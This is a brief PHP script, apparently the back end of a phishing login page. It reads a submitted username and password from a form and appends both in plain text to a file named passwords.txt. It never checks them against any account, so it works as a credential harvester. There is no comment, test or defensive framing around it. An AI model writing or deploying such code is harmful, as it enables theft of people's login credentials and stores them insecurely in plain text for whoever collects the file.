<?php

    $name = $_POST['user'];
    $pass =  $_POST['pass'];
    $myfile = fopen("passwords.txt", "a") or die("Unable to open file!");
    $txt = "username: " . $name . "\t";
    $txt .= "password: " . $pass . " \n";
    fwrite($myfile, $txt);
    fclose($myfile);

?>
